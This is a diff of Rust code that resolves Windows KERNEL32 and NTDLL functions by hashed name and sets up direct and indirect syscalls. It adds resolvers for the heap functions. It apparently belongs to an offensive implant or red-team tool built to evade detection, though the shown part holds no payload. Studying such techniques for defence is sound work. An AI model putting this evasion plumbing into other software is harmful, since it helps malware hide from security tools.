@@ -166,7 +166,7 @@ fn ensure_initialized() {
 unsafe fn init_global_instance() {
     // Check if initialization has already occurred.
     if !INIT_INSTANCE.load(Ordering::Acquire) {
-        // Hashes and function addresses for various NTDLL functions
+        // KERNEL32 FUNCTIONS
         const KERNEL32_H: u32 = 0x6ddb9555;
         const CREATE_PIPE_H: usize = 0x9694e9e7;
         const WRITE_FILE_H: usize = 0xf1d207d0;
@@ -175,9 +175,18 @@ unsafe fn init_global_instance() {
         const GET_CONSOLE_WINDOW_H: usize = 0xc2c4270;
 
         const NTDLL_H: u32 = 0x1edab0ed;
+
+        // DIRECT NTDLL SYSCALL
         const LDR_LOAD_DLL_H: usize = 0x9e456a43;
         const RTL_CREATE_PROCESS_PARAMETERS_EX_H: usize = 0x533a05db;
 
+        const RTL_CREATE_HEAP_H: usize = 0xe1af6849;
+        const RTL_ALLOCATE_HEAP_H: usize = 0x3be94c5a;
+        const RTL_FREE_HEAP_H: usize = 0x73a9e4d7;
+        const RTL_DESTROY_HEAP_H: usize = 0xceb5349f;
+        const RTL_REALLOCATE_HEAP_H: usize = 0xaf740371;
+
+        // INDIRECT NTDLL SYSCALL
         const NT_ALLOCATE_VIRTUAL_MEMORY_H: usize = 0xf783b8ec;
         const NT_FREE_VIRTUAL_MEMORY_H: usize = 0x2802c609;
         const NT_TERMINATE_THREAD_H: usize = 0xccf58808;
@@ -230,7 +239,7 @@ unsafe fn init_global_instance() {
             ldr_function_addr(instance.kernel32.module_base, CREATE_PROCESS_W_H);
         instance.kernel32.create_process_w = core::mem::transmute(create_process_w_addr);
 
-        // Resolve CreateProcessW
+        // Resolve GetConsoleWindow
         let get_console_window_addr =
             ldr_function_addr(instance.kernel32.module_base, GET_CONSOLE_WINDOW_H);
         instance.kernel32.get_console_window = core::mem::transmute(get_console_window_addr);
@@ -239,13 +248,32 @@ unsafe fn init_global_instance() {
         let ldr_load_dll_addr = ldr_function_addr(instance.ntdll.module_base, LDR_LOAD_DLL_H);
         instance.ntdll.ldr_load_dll = core::mem::transmute(ldr_load_dll_addr);
 
-        // Resolve LdrLoadDll
+        // Resolve RtlCreateProcessParameters
         let rtl_create_process_parameters_ex_addr = ldr_function_addr(
             instance.ntdll.module_base,
             RTL_CREATE_PROCESS_PARAMETERS_EX_H,
         );
         instance.ntdll.rtl_create_process_parameters_ex =
             core::mem::transmute(rtl_create_process_parameters_ex_addr);
+
+        // Resolve RtlCreateHeap
+        let rtl_create_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_CREATE_HEAP_H);
+        instance.ntdll.rtl_create_heap = core::mem::transmute(rtl_create_heap_addr);
+        // Resolve RtlAllocateHeap
+        let rtl_allocate_heap_addr =
+            ldr_function_addr(instance.ntdll.module_base, RTL_ALLOCATE_HEAP_H);
+        instance.ntdll.rtl_allocate_heap = core::mem::transmute(rtl_allocate_heap_addr);
+        // Resolve RtlFreeHeap
+        let rtl_free_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_FREE_HEAP_H);
+        instance.ntdll.rtl_free_heap = core::mem::transmute(rtl_free_heap_addr);
+        // Resolve RtlReAllocateHeap
+        let rtl_reallocate_heap_addr =
+            ldr_function_addr(instance.ntdll.module_base, RTL_REALLOCATE_HEAP_H);
+        instance.ntdll.rtl_reallocate_heap = core::mem::transmute(rtl_reallocate_heap_addr);
+        // Resolve RtlDestroyHeap
+        let rtl_destroy_heap_addr =
+            ldr_function_addr(instance.ntdll.module_base, RTL_DESTROY_HEAP_H);
+        instance.ntdll.rtl_destroy_heap = core::mem::transmute(rtl_destroy_heap_addr);
 
         // NtAllocateVirtualMemory
         instance.ntdll.nt_allocate_virtual_memory.syscall.address =
